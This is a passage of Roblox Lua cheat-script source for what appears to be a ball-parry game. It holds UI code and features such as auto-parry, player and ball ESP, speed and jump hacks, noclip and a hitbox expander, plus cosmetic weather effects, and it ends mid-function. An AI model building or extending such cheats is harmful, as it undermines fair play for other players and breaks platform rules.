            buttonFrame.BorderSizePixel = 0
            buttonFrame.Size = UDim2.new(1, 0, 0, 40)
            buttonFrame.Font = Enum.Font.GothamSemibold
            buttonFrame.Text = config.Title
            buttonFrame.TextColor3 = Colors.Text
            buttonFrame.TextSize = 12
            buttonFrame.AutoButtonColor = false
            
            local buttonCorner = Instance.new("UICorner")
            buttonCorner.CornerRadius = UDim.new(0, 8)
            buttonCorner.Parent = buttonFrame
            
            local buttonStroke = Instance.new("UIStroke")
            buttonStroke.Color = Colors.Border
            buttonStroke.Thickness = 1
            buttonStroke.Parent = buttonFrame
            
            buttonFrame.MouseButton1Click:Connect(function()
                Tween(buttonFrame, {BackgroundColor3 = Colors.Accent}, 0.1)
                Tween(buttonFrame, {TextColor3 = Colors.Background}, 0.1)
                task.wait(0.1)
                Tween(buttonFrame, {BackgroundColor3 = Colors.CardHover, TextColor3 = Colors.Text}, 0.1)
                if config.Callback then pcall(config.Callback) end
            end)
            
            buttonFrame.MouseEnter:Connect(function()
                Tween(buttonFrame, {BackgroundColor3 = Colors.CardHover}, 0.15)
            end)
            
            buttonFrame.MouseLeave:Connect(function()
                Tween(buttonFrame, {BackgroundColor3 = Colors.Card}, 0.15)
            end)
        end
        
        function Section:AddDropdown(config)
            local Dropdown = {Value = config.Default or config.Options[1]}
            local open = false
            
            local dropFrame = Instance.new("Frame")
            dropFrame.Parent = sectionFrame
            dropFrame.BackgroundColor3 = Colors.Card
            dropFrame.BorderSizePixel = 0
            dropFrame.Size = UDim2.new(1, 0, 0, 40)
            dropFrame.ClipsDescendants = true
            
            local dropCorner = Instance.new("UICorner")
            dropCorner.CornerRadius = UDim.new(0, 8)
            dropCorner.Parent = dropFrame
            
            local dropStroke = Instance.new("UIStroke")
            dropStroke.Color = Colors.Border
            dropStroke.Thickness = 1
            dropStroke.Parent = dropFrame
            
            local dropLabel = Instance.new("TextLabel")
            dropLabel.Parent = dropFrame
            dropLabel.BackgroundTransparency = 1
            dropLabel.Position = UDim2.new(0, 12, 0, 0)
            dropLabel.Size = UDim2.new(0.5, -12, 0, 40)
            dropLabel.Font = Enum.Font.Gotham
            dropLabel.Text = config.Title
            dropLabel.TextColor3 = Colors.Text
            dropLabel.TextSize = 12
            dropLabel.TextXAlignment = Enum.TextXAlignment.Left
            
            local dropValue = Instance.new("TextLabel")
            dropValue.Parent = dropFrame
            dropValue.BackgroundTransparency = 1
            dropValue.Position = UDim2.new(0.5, 0, 0, 0)
            dropValue.Size = UDim2.new(0.5, -30, 0, 40)
            dropValue.Font = Enum.Font.GothamSemibold
            dropValue.Text = Dropdown.Value
            dropValue.TextColor3 = Colors.AccentDim
            dropValue.TextSize = 11
            dropValue.TextXAlignment = Enum.TextXAlignment.Right
            
            local dropArrow = Instance.new("TextLabel")
            dropArrow.Parent = dropFrame
            dropArrow.BackgroundTransparency = 1
            dropArrow.Position = UDim2.new(1, -22, 0, 0)
            dropArrow.Size = UDim2.new(0, 18, 0, 40)
            dropArrow.Font = Enum.Font.GothamBold
            dropArrow.Text = "v"
            dropArrow.TextColor3 = Colors.TextDim
            dropArrow.TextSize = 10
            
            local dropBtn = Instance.new("TextButton")
            dropBtn.Parent = dropFrame
            dropBtn.BackgroundTransparency = 1
            dropBtn.Size = UDim2.new(1, 0, 0, 40)
            dropBtn.Text = ""
            
            local optionContainer = Instance.new("Frame")
            optionContainer.Parent = dropFrame
            optionContainer.BackgroundTransparency = 1
            optionContainer.Position = UDim2.new(0, 8, 0, 45)
            optionContainer.Size = UDim2.new(1, -16, 0, #config.Options * 32)
            
            local optionLayout = Instance.new("UIListLayout")
            optionLayout.Parent = optionContainer
            optionLayout.Padding = UDim.new(0, 4)
            
            for _, opt in ipairs(config.Options) do
                local optBtn = Instance.new("TextButton")
                optBtn.Parent = optionContainer
                optBtn.BackgroundColor3 = Colors.CardHover
                optBtn.BorderSizePixel = 0
                optBtn.Size = UDim2.new(1, 0, 0, 28)
                optBtn.Font = Enum.Font.Gotham
                optBtn.Text = opt
                optBtn.TextColor3 = opt == Dropdown.Value and Colors.Accent or Colors.TextDim
                optBtn.TextSize = 11
                optBtn.AutoButtonColor = false
                
                local optCorner = Instance.new("UICorner")
                optCorner.CornerRadius = UDim.new(0, 6)
                optCorner.Parent = optBtn
                
                optBtn.MouseButton1Click:Connect(function()
                    Dropdown.Value = opt
                    dropValue.Text = opt
                    for _, child in ipairs(optionContainer:GetChildren()) do
                        if child:IsA("TextButton") then
                            child.TextColor3 = child.Text == opt and Colors.Accent or Colors.TextDim
                        end
                    end
                    open = false
                    Tween(dropFrame, {Size = UDim2.new(1, 0, 0, 40)}, 0.2, Enum.EasingStyle.Back)
                    Tween(dropArrow, {Rotation = 0}, 0.2)
                    if config.Callback then pcall(config.Callback, opt) end
                end)
            end
            
            dropBtn.MouseButton1Click:Connect(function()
                open = not open
                if open then
                    Tween(dropFrame, {Size = UDim2.new(1, 0, 0, 50 + #config.Options * 32)}, 0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
                    Tween(dropArrow, {Rotation = 180}, 0.2)
                else
                    Tween(dropFrame, {Size = UDim2.new(1, 0, 0, 40)}, 0.2, Enum.EasingStyle.Back, Enum.EasingDirection.In)
                    Tween(dropArrow, {Rotation = 0}, 0.2)
                end
            end)
            
            return Dropdown
        end
        
        function Section:AddLabel(text)
            local labelFrame = Instance.new("TextLabel")
            labelFrame.Parent = sectionFrame
            labelFrame.BackgroundTransparency = 1
            labelFrame.Size = UDim2.new(1, 0, 0, 20)
            labelFrame.Font = Enum.Font.Gotham
            labelFrame.Text = text
            labelFrame.TextColor3 = Colors.TextDim
            labelFrame.TextSize = 11
            labelFrame.TextXAlignment = Enum.TextXAlignment.Left
            
            return {
                Set = function(_, newText)
                    labelFrame.Text = newText
                end
            }
        end
        
        return Section
    end
    
    return Tab
end

-- ========================================
-- FEATURES
-- ========================================

local Features = {
    AutoParry = {Enabled = false, Connection = nil},
    AutoUseAbility = {Enabled = false, Connection = nil},
    ManualSpam = {Enabled = false},
    BallESP = {Enabled = false, Items = {}},
    ESP = {Enabled = false, Items = {}},
    Speed = {Enabled = false, Value = 50},
    Jump = {Enabled = false, Value = 100},
    AutoPlay = {Enabled = false, Style = "Balanced"},
    AntiAFK = {Enabled = true},
    InfiniteJump = {Enabled = false, Connection = nil},
    Noclip = {Enabled = false, Connection = nil},
    Fullbright = {Enabled = false},
    HitboxExpander = {Enabled = false, Size = 10},
    FPSBoost = {Enabled = false}
}

-- Shader State
local ShaderState = {
    RainEnabled = false,
    SnowEnabled = false,
    ThunderstormEnabled = false,
    AuroraEnabled = false,
    MoonGlowEnabled = false,
    RainConnection = nil,
    SnowConnection = nil,
    LightningConnection = nil,
    AuroraConnection = nil,
    RainFolder = nil,
    SnowFolder = nil,
    AuroraFolder = nil,
    RainSound = nil,
    SnowSound = nil,
    ThunderSound = nil,
    OriginalLighting = {}
}

-- YOUR EXACT ORIGINAL AUTO PARRY CODE
local parryDistance = 0.75
local Parried = false
local ParryConnection = nil

local function GetBall()
    for _, Ball in ipairs(Balls:GetChildren()) do
        if Ball:GetAttribute("realBall") then
            return Ball
        end
    end
end

local function ResetParryConnection()
    if ParryConnection then
        ParryConnection:Disconnect()
        ParryConnection = nil
    end
end

Balls.ChildAdded:Connect(function()
    local Ball = GetBall()
    if not Ball then return end
    ResetParryConnection()
    ParryConnection = Ball:GetAttributeChangedSignal("target"):Connect(function()
        Parried = false
    end)
end)

function Features.AutoParry:Start()
    if self.Enabled then return end
    self.Enabled = true
    
    self.Connection = RunService.PreSimulation:Connect(function()
        if not self.Enabled then return end
        
        local Ball = GetBall()
        local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if not Ball or not HRP then return end
        
        local Speed = Ball.zoomies.VectorVelocity.Magnitude
        local Distance = (HRP.Position - Ball.Position).Magnitude
        
        if Ball:GetAttribute("target") == Player.Name and not Parried and Distance / Speed <= parryDistance then
            VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
            Parried = true
        end
    end)
end

function Features.AutoParry:Stop()
    self.Enabled = false
    if self.Connection then
        self.Connection:Disconnect()
        self.Connection = nil
    end
end

function Features.AutoParry:SetDistance(value)
    parryDistance = value
end

-- AUTO USE ABILITY
function Features.AutoUseAbility:Start()
    if self.Enabled then return end
    self.Enabled = true
    
    self.Connection = RunService.Heartbeat:Connect(function()
        if not self.Enabled then return end
        
        pcall(function()
            -- Try to find and use ability
            local abilityRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("UseAbility")
            if abilityRemote then
                abilityRemote:FireServer()
            end
            
            -- Alternative method - press Q key
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Q, false, game)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Q, false, game)
        end)
        
        task.wait(0.5) -- Cooldown between ability uses
    end)
end

function Features.AutoUseAbility:Stop()
    self.Enabled = false
    if self.Connection then
        self.Connection:Disconnect()
        self.Connection = nil
    end
end

-- Manual Spam
function Features.ManualSpam:Start()
    if self.Enabled then return end
    self.Enabled = true
    task.spawn(function()
        while self.Enabled do
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
            task.wait(0.001)
        end
    end)
end

function Features.ManualSpam:Stop()
    self.Enabled = false
end

-- Ball ESP
function Features.BallESP:Start()
    if self.Enabled then return end
    self.Enabled = true
    
    local function CreateBallESP(ball)
        if self.Items[ball] then return end
        self.Items[ball] = {}
        
        local hl = Instance.new("Highlight")
        hl.Parent = ball
        hl.FillColor = Color3.fromRGB(0, 200, 255)
        hl.OutlineColor = Color3.fromRGB(255, 255, 255)
        hl.FillTransparency = 0.5
        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        table.insert(self.Items[ball], hl)
        
        local bb = Instance.new("BillboardGui")
        bb.Parent = ball
        bb.Size = UDim2.new(0, 90, 0, 35)
        bb.StudsOffset = Vector3.new(0, 3, 0)
        bb.AlwaysOnTop = true
        table.insert(self.Items[ball], bb)
        
        local bg = Instance.new("Frame")
        bg.Parent = bb
        bg.Size = UDim2.new(1, 0, 1, 0)
        bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        bg.BackgroundTransparency = 0.1
        
        local bgCorner = Instance.new("UICorner")
        bgCorner.CornerRadius = UDim.new(0, 6)
        bgCorner.Parent = bg
        
        local status = Instance.new("TextLabel")
        status.Name = "Status"
        status.Parent = bg
        status.Position = UDim2.new(0, 0, 0, 2)
        status.Size = UDim2.new(1, 0, 0.5, 0)
        status.BackgroundTransparency = 1
        status.Font = Enum.Font.GothamBold
        status.Text = "SAFE"
        status.TextColor3 = Colors.Success
        status.TextSize = 11
        
        local info = Instance.new("TextLabel")
        info.Name = "Info"
        info.Parent = bg
        info.Position = UDim2.new(0, 0, 0.5, 0)
        info.Size = UDim2.new(1, 0, 0.5, 0)
        info.BackgroundTransparency = 1
        info.Font = Enum.Font.Gotham
        info.Text = "0 studs"
        info.TextColor3 = Colors.TextDim
        info.TextSize = 9
        
        local conn = RunService.RenderStepped:Connect(function()
            if not ball or not ball.Parent then conn:Disconnect() return end
            if not self.Enabled then hl.Enabled = false bb.Enabled = false return end
            
            hl.Enabled = true
            bb.Enabled = true
            
            local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not HRP then return end
            
            local dist = (HRP.Position - ball.Position).Magnitude
            local target = ball:GetAttribute("target")
            local isTargeting = target == Player.Name
            
            info.Text = string.format("%.0f studs", dist)
            
            if isTargeting then
                if dist <= 15 then
                    hl.FillColor = Colors.Danger
                    status.Text = "PARRY!"
                    status.TextColor3 = Colors.Danger
                elseif dist <= 30 then
                    hl.FillColor = Colors.Warning
                    status.Text = "INCOMING"
                    status.TextColor3 = Colors.Warning
                else
                    hl.FillColor = Color3.fromRGB(255, 200, 100)
                    status.Text = "TRACKING"
                    status.TextColor3 = Color3.fromRGB(255, 200, 100)
                end
            else
                hl.FillColor = Colors.Success
                status.Text = "SAFE"
                status.TextColor3 = Colors.Success
            end
        end)
        
        table.insert(self.Items[ball], conn)
    end
    
    for _, ball in pairs(Balls:GetChildren()) do
        if ball:IsA("BasePart") then CreateBallESP(ball) end
    end
    
    Balls.ChildAdded:Connect(function(ball)
        if self.Enabled and ball:IsA("BasePart") then
            task.wait(0.1)
            CreateBallESP(ball)
        end
    end)
end

function Features.BallESP:Stop()
    self.Enabled = false
    for ball, items in pairs(self.Items) do
        for _, item in pairs(items) do
            if typeof(item) == "RBXScriptConnection" then item:Disconnect()
            else pcall(function() item:Destroy() end) end
        end
    end
    self.Items = {}
end

-- Player ESP
function Features.ESP:Start()
    if self.Enabled then return end
    self.Enabled = true
    
    local function addHighlight(player)
        if player == Player then return end
        local function createHighlight(char)
            if not char then return end
            if self.Items[player] then pcall(function() self.Items[player]:Destroy() end) end
            local highlight = Instance.new("Highlight")
            highlight.Parent = char
            highlight.FillColor = Color3.fromRGB(255, 50, 50)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.FillTransparency = 0.5
            self.Items[player] = highlight
        end
        if player.Character then createHighlight(player.Character) end
        player.CharacterAdded:Connect(function(char)
            task.wait(0.1)
            if self.Enabled then createHighlight(char) end
        end)
    end
    
    for _, player in ipairs(Players:GetPlayers()) do addHighlight(player) end
    Players.PlayerAdded:Connect(function(player) if self.Enabled then addHighlight(player) end end)
end

function Features.ESP:Stop()
    self.Enabled = false
    for _, highlight in pairs(self.Items) do if highlight then pcall(function() highlight:Destroy() end) end end
    self.Items = {}
end

-- Auto Play
local autoPlayAngle = 0

RunService.Heartbeat:Connect(function(dt)
    if not Features.AutoPlay.Enabled then return end
    
    local ball = GetBall()
    if not ball or not ball.Parent then return end
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChild("Humanoid")
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
    if not Humanoid or not HRP then return end
    
    local ballPos = ball.Position
    autoPlayAngle = autoPlayAngle + dt * 1.5
    
    local targetPos
    local style = Features.AutoPlay.Style
    
    if style == "Aggressive" then
        local dist = (HRP.Position - ballPos).Magnitude
        if dist > 12 then targetPos = ballPos
        else targetPos = ballPos + Vector3.new(math.cos(autoPlayAngle) * 8, 0, math.sin(autoPlayAngle) * 8) end
    elseif style == "Defensive" then
        targetPos = ballPos + Vector3.new(math.cos(autoPlayAngle) * 28, 0, math.sin(autoPlayAngle) * 28)
    else
        targetPos = ballPos + Vector3.new(math.cos(autoPlayAngle) * 16, 0, math.sin(autoPlayAngle) * 16)
    end
    
    if targetPos then Humanoid:MoveTo(targetPos) end
end)

-- Speed/Jump
function Features.Speed:Start()
    if self.Enabled then return end
    self.Enabled = true
    local humanoid = Player.Character and Player.Character:FindFirstChild("Humanoid")
    if humanoid then humanoid.WalkSpeed = self.Value end
end
function Features.Speed:Stop()
    self.Enabled = false
    local humanoid = Player.Character and Player.Character:FindFirstChild("Humanoid")
    if humanoid then humanoid.WalkSpeed = 16 end
end
function Features.Speed:Update()
    local humanoid = Player.Character and Player.Character:FindFirstChild("Humanoid")
    if humanoid and self.Enabled then humanoid.WalkSpeed = self.Value end
end

function Features.Jump:Start()
    if self.Enabled then return end
    self.Enabled = true
    local humanoid = Player.Character and Player.Character:FindFirstChild("Humanoid")
    if humanoid then humanoid.JumpPower = self.Value end
end
function Features.Jump:Stop()
    self.Enabled = false
    local humanoid = Player.Character and Player.Character:FindFirstChild("Humanoid")
    if humanoid then humanoid.JumpPower = 50 end
end
function Features.Jump:Update()
    local humanoid = Player.Character and Player.Character:FindFirstChild("Humanoid")
    if humanoid and self.Enabled then humanoid.JumpPower = self.Value end
end

-- Infinite Jump
function Features.InfiniteJump:Start()
    if self.Enabled then return end
    self.Enabled = true
    self.Connection = UserInputService.JumpRequest:Connect(function()
        if self.Enabled then
            local humanoid = Player.Character and Player.Character:FindFirstChild("Humanoid")
            if humanoid then humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end
        end
    end)
end
function Features.InfiniteJump:Stop()
    self.Enabled = false
    if self.Connection then self.Connection:Disconnect() self.Connection = nil end
end

-- Noclip
function Features.Noclip:Start()
    if self.Enabled then return end
    self.Enabled = true
    self.Connection = RunService.Stepped:Connect(function()
        if self.Enabled and Player.Character then
            for _, part in pairs(Player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
end
function Features.Noclip:Stop()
    self.Enabled = false
    if self.Connection then self.Connection:Disconnect() self.Connection = nil end
end

-- Fullbright
local originalAmbient, originalBrightness, originalOutdoorAmbient
function Features.Fullbright:Start()
    if self.Enabled then return end
    self.Enabled = true
    originalAmbient = Lighting.Ambient
    originalBrightness = Lighting.Brightness
    originalOutdoorAmbient = Lighting.OutdoorAmbient
    Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    Lighting.Brightness = 2
    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
end
function Features.Fullbright:Stop()
    self.Enabled = false
    if originalAmbient then Lighting.Ambient = originalAmbient end
    if originalBrightness then Lighting.Brightness = originalBrightness end
    if originalOutdoorAmbient then Lighting.OutdoorAmbient = originalOutdoorAmbient end
end

-- Hitbox Expander
function Features.HitboxExpander:Start()
    if self.Enabled then return end
    self.Enabled = true
    
    local function expandHitbox(player)
        if player == Player then return end
        local char = player.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.Size = Vector3.new(self.Size, self.Size, self.Size)
                hrp.Transparency = 0.8
                hrp.BrickColor = BrickColor.new("Really red")
                hrp.Material = Enum.Material.ForceField
                hrp.CanCollide = false
            end
        end
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        expandHitbox(player)
        player.CharacterAdded:Connect(function()
            task.wait(1)
            if self.Enabled then expandHitbox(player) end
        end)
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function()
            task.wait(1)
            if self.Enabled then expandHitbox(player) end
        end)
    end)
end

function Features.HitboxExpander:Stop()
    self.Enabled = false
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= Player and player.Character then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.Size = Vector3.new(2, 2, 1)
                hrp.Transparency = 1
                hrp.Material = Enum.Material.Plastic
            end
        end
    end
end

-- FPS BOOSTER
function Features.FPSBoost:Start()
    if self.Enabled then return end
    self.Enabled = true
    
    pcall(function()
        settings().Rendering.QualityLevel = 1
        
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
                v.Material = Enum.Material.Plastic
                v.Reflectance = 0
            elseif v:IsA("Decal") or v:IsA("Texture") then
                v.Transparency = 1
            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then
                v.Enabled = false
            elseif v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
                v.Enabled = false
            end
        end
        
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        
        for _, effect in pairs(Lighting:GetChildren()) do
            if effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") or effect:IsA("ColorCorrectionEffect") or effect:IsA("BloomEffect") or effect:IsA("DepthOfFieldEffect") then
                effect.Enabled = false
            end
        end
        
        if sethiddenproperty then
            sethiddenproperty(Lighting, "Technology", 2)
        end
    end)
end

function Features.FPSBoost:Stop()
    self.Enabled = false
    pcall(function()
        settings().Rendering.QualityLevel = 7
        Lighting.GlobalShadows = true
    end)
end

-- Anti-AFK
Player.Idled:Connect(function()
    if Features.AntiAFK.Enabled then
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end
end)

-- Character respawn
Player.CharacterAdded:Connect(function(char)
    task.wait(1)
    if Features.Speed.Enabled then
        local humanoid = char:FindFirstChild("Humanoid")
        if humanoid then humanoid.WalkSpeed = Features.Speed.Value end
    end
    if Features.Jump.Enabled then
        local humanoid = char:FindFirstChild("Humanoid")
        if humanoid then humanoid.JumpPower = Features.Jump.Value end
    end
end)

-- ========================================
-- SHADER SYSTEM (From MM2 Script)
-- ========================================

local SOUND_IDS = {
    Rain = "rbxassetid://9112854440",
    Thunder = "rbxassetid://9114488091",
    Wind = "rbxassetid://9112849858",
}

local function createWeatherSound(soundType)
    local sound = Instance.new("Sound")
    sound.Name = soundType .. "Sound"
    sound.SoundId = SOUND_IDS[soundType]
    sound.Volume = 0.5
    sound.Looped = true
    sound.Parent = Camera
    return sound
end

local function storeOriginalLighting()
    if not ShaderState.OriginalLighting.Ambient then
        ShaderState.OriginalLighting = {
            Ambient = Lighting.Ambient,
            Brightness = Lighting.Brightness,
            ClockTime = Lighting.ClockTime,
            FogColor = Lighting.FogColor,
            FogEnd = Lighting.FogEnd,
            FogStart = Lighting.FogStart,
            OutdoorAmbient = Lighting.OutdoorAmbient,
            ColorShift_Top = Lighting.ColorShift_Top,
            ColorShift_Bottom = Lighting.ColorShift_Bottom,
        }
    end
end

local function restoreOriginalLighting()
    if ShaderState.OriginalLighting.Ambient then
        pcall(function()
            Lighting.Ambient = ShaderState.OriginalLighting.Ambient
            Lighting.Brightness = ShaderState.OriginalLighting.Brightness
            Lighting.ClockTime = ShaderState.OriginalLighting.ClockTime
            Lighting.FogColor = ShaderState.OriginalLighting.FogColor
            Lighting.FogEnd = ShaderState.OriginalLighting.FogEnd
            Lighting.FogStart = ShaderState.OriginalLighting.FogStart
            Lighting.OutdoorAmbient = ShaderState.OriginalLighting.OutdoorAmbient
            Lighting.ColorShift_Top = ShaderState.OriginalLighting.ColorShift_Top
            Lighting.ColorShift_Bottom = ShaderState.OriginalLighting.ColorShift_Bottom
        end)
    end
end

-- RAIN
local function enableRain()
    if ShaderState.RainConnection then return end
    storeOriginalLighting()
    
    ShaderState.RainFolder = Instance.new("Folder")
    ShaderState.RainFolder.Name = "RainEffects"
    ShaderState.RainFolder.Parent = Camera
    
    local raindrops = {}
    for i = 1, 200 do
        local drop = Instance.new("Part")
        drop.Size = Vector3.new(0.05, math.random(15, 25) / 10, 0.05)
        drop.Material = Enum.Material.Neon
        drop.Color = Color3.fromRGB(150, 180, 220)
        drop.Transparency = 0.3
        drop.Anchored = true
        drop.CanCollide = false
        drop.CastShadow = false
        drop.Parent = ShaderState.RainFolder
        
        table.insert(raindrops, {
            part = drop,
            speed = math.random(80, 120),
            offset = Vector3.new(math.random(-60, 60), math.random(20, 80), math.random(-60, 60))
        })
    end
    
    Lighting.ClockTime = 16
    Lighting.Brightness = 0.5
    Lighting.Ambient = Color3.fromRGB(40, 45, 55)
    Lighting.OutdoorAmbient = Color3.fromRGB(50, 55, 65)
    Lighting.FogColor = Color3.fromRGB(80, 85, 95)
    Lighting.FogEnd = 400
    Lighting.FogStart = 10
    
    ShaderState.RainSound = createWeatherSound("Rain")
    ShaderState.RainSound:Play()
    
    ShaderState.RainConnection = RunService.RenderStepped:Connect(function(dt)
        local camPos = Camera.CFrame.Position
        for _, data in ipairs(raindrops) do
            local drop = data.part
            if drop and drop.Parent then
                local newY = drop.Position.Y - data.speed * dt
                if newY < camPos.Y - 30 then
                    newY = camPos.Y + math.random(40, 80)
                    data.offset = Vector3.new(math.random(-60, 60), 0, math.random(-60, 60))
                end
                drop.CFrame = CFrame.new(camPos.X + data.offset.X, newY, camPos.Z + data.offset.Z)
            end
        end
    end)
    
    ShaderState.RainEnabled = true
end

local function disableRain()
    if ShaderState.RainConnection then
        ShaderState.RainConnection:Disconnect()
        ShaderState.RainConnection = nil
    end
    if ShaderState.RainFolder then
        ShaderState.RainFolder:Destroy()
        ShaderState.RainFolder = nil
    end
    if ShaderState.RainSound then
        ShaderState.RainSound:Stop()
        ShaderState.RainSound:Destroy()
        ShaderState.RainSound = nil
    end
    ShaderState.RainEnabled = false
    if not ShaderState.SnowEnabled and not ShaderState.AuroraEnabled and not ShaderState.MoonGlowEnabled then
        restoreOriginalLighting()
    end
end

-- SNOW
local function enableSnow()
    if ShaderState.SnowConnection then return end
    storeOriginalLighting()
    
    ShaderState.SnowFolder = Instance.new("Folder")
    ShaderState.SnowFolder.Name = "SnowEffects"
    ShaderState.SnowFolder.Parent = Camera
    
    local snowflakes = {}
    for i = 1, 150 do
        local flake = Instance.new("Part")
        flake.Shape = Enum.PartType.Ball
        local size = math.random(2, 6) / 10
        flake.Size = Vector3.new(size, size, size)
        flake.Material = Enum.Material.Neon
        flake.Color = Color3.fromRGB(255, 255, 255)
        flake.Transparency = 0.2
        flake.Anchored = true
        flake.CanCollide = false
        flake.CastShadow = false
        flake.Parent = ShaderState.SnowFolder
        
        table.insert(snowflakes, {
            part = flake,
            speed = math.random(8, 20),
            driftX = math.random(-20, 20) / 10,
            driftZ = math.random(-20, 20) / 10,
            phase = math.random() * math.pi * 2,
            offset = Vector3.new(math.random(-70, 70), math.random(20, 100), math.random(-70, 70))
        })
    end
    
    Lighting.ClockTime = 11
    Lighting.Brightness = 1.0
    Lighting.Ambient = Color3.fromRGB(160, 175, 200)
    Lighting.OutdoorAmbient = Color3.fromRGB(170, 185, 210)
    Lighting.FogColor = Color3.fromRGB(200, 210, 230)
    Lighting.FogEnd = 350
    Lighting.FogStart = 30
    
    ShaderState.SnowSound = createWeatherSound("Wind")
    ShaderState.SnowSound.Volume = 0.35
    ShaderState.SnowSound:Play()
    
    local time = 0
    ShaderState.SnowConnection = RunService.RenderStepped:Connect(function(dt)
        time = time + dt
        local camPos = Camera.CFrame.Position
        for _, data in ipairs(snowflakes) do
            local flake = data.part
            if flake and flake.Parent then
                local newY = flake.Position.Y - data.speed * dt
                local driftX = math.sin(time * data.driftX + data.phase) * 0.3
                local driftZ = math.cos(time * data.driftZ + data.phase) * 0.3
                if newY < camPos.Y - 40 then
                    newY = camPos.Y + math.random(60, 100)
                    data.offset = Vector3.new(math.random(-70, 70), 0, math.random(-70, 70))
                end
                flake.CFrame = CFrame.new(camPos.X + data.offset.X + driftX, newY, camPos.Z + data.offset.Z + driftZ)
            end
        end
    end)
    
    ShaderState.SnowEnabled = true
end

local function disableSnow()
    if ShaderState.SnowConnection then
        ShaderState.SnowConnection:Disconnect()
        ShaderState.SnowConnection = nil
    end
    if ShaderState.SnowFolder then
        ShaderState.SnowFolder:Destroy()
        ShaderState.SnowFolder = nil
    end
    if ShaderState.SnowSound then
        ShaderState.SnowSound:Stop()
        ShaderState.SnowSound:Destroy()
        ShaderState.SnowSound = nil
    end
    ShaderState.SnowEnabled = false
    if not ShaderState.RainEnabled and not ShaderState.AuroraEnabled and not ShaderState.MoonGlowEnabled then
        restoreOriginalLighting()
    end
end

-- AURORA
local function enableAurora()
    if ShaderState.AuroraConnection then return end
    storeOriginalLighting()
    
    Lighting.ClockTime = 0
    Lighting.Brightness = 0.4
    Lighting.Ambient = Color3.fromRGB(15, 25, 45)
    Lighting.OutdoorAmbient = Color3.fromRGB(25, 40, 65)
    
    ShaderState.AuroraFolder = Instance.new("Folder")
    ShaderState.AuroraFolder.Name = "AuroraEffects"
    ShaderState.AuroraFolder.Parent = Workspace
    
    local auroraParts = {}
    for i = 1, 15 do
        local part = Instance.new("Part")
        part.Anchored = true
        part.CanCollide = false
        part.Material = Enum.Material.Neon
        part.Transparency = 0.4
        part.Size = Vector3.new(math.random(100, 250), math.random(200, 500), 10)
        part.CFrame = CFrame.new(math.random(-500, 500), math.random(300, 550), math.random(-500, 500)) * CFrame.Angles(0, math.rad(math.random(0, 360)), math.rad(math.random(-20, 20)))
        part.Parent = ShaderState.AuroraFolder
        table.insert(auroraParts, {part = part, phase = math.random() * math.pi * 2, colorPhase = math.random() * math.pi * 2})
    end
    
    local bloom = Instance.new("BloomEffect")
    bloom.Name = "AuroraBloom"
    bloom.Intensity = 2
    bloom.Size = 50
    bloom.Threshold = 0.6
    bloom.Parent = Lighting
    
    local time = 0
    ShaderState.AuroraConnection = RunService.Heartbeat:Connect(function(dt)
        time = time + dt
        for _, data in ipairs(auroraParts) do
            local part = data.part
            if part and part.Parent then
                local wave = math.sin(time * 0.3 + data.phase) * 20
                part.CFrame = part.CFrame * CFrame.new(0, wave * dt, 0)
                local hue = (math.sin(time * 0.15 + data.colorPhase) + 1) / 2 * 0.4 + 0.35
                part.Color = Color3.fromHSV(hue, 0.85, 1)
                part.Transparency = 0.3 + math.sin(time * 1.5 + data.phase) * 0.2
            end
        end
    end)
    
    ShaderState.AuroraEnabled = true
end

local function disableAurora()
    if ShaderState.AuroraConnection then
        ShaderState.AuroraConnection:Disconnect()
        ShaderState.AuroraConnection = nil
    end
    if ShaderState.AuroraFolder then
        ShaderState.AuroraFolder:Destroy()
        ShaderState.AuroraFolder = nil
    end
    local bloom = Lighting:FindFirstChild("AuroraBloom")
    if bloom then bloom:Destroy() end
    ShaderState.AuroraEnabled = false
    if not ShaderState.RainEnabled and not ShaderState.SnowEnabled and not ShaderState.MoonGlowEnabled then
        restoreOriginalLighting()
    end
end

-- MOON GLOW
local function enableMoonGlow()
    storeOriginalLighting()
    
    Lighting.ClockTime = 0
    Lighting.Brightness = 0.6
    Lighting.Ambient = Color3.fromRGB(35, 45, 70)
    Lighting.OutdoorAmbient = Color3.fromRGB(45, 55, 85)
    
    local bloom = Instance.new("BloomEffect")
    bloom.Name = "MoonBloom"
    bloom.Intensity = 2.5
    bloom.Size = 60
    bloom.Threshold = 0.5
    bloom.Parent = Lighting
    
    local atmo = Instance.new("Atmosphere")
    atmo.Name = "MoonAtmosphere"
    atmo.Density = 0.25
    atmo.Color = Color3.fromRGB(45, 55, 90)
    atmo.Decay = Color3.fromRGB(35, 45, 80)
    atmo.Haze = 1.2
    atmo.Parent = Lighting
    
